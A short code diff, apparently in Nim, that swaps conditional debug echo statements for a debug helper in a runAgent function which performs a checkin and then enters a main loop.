+  debug "[DEBUG] runAgent: Agent instance created, starting checkin..."
   
   # Perform initial checkin
   if not agentInstance.checkin():
-    if cfg.debug:
-      echo "[DEBUG] runAgent: Checkin failed, exiting"
+    debug "[DEBUG] runAgent: Checkin failed, exiting"
     return
   
-  if cfg.debug:
-    echo "[DEBUG] runAgent: Checkin successful, entering main loop"
+  debug "[DEBUG] runAgent: Checkin successful, entering main loop"
   
   # Main agent loop
   while not agentInstance.shouldExit:
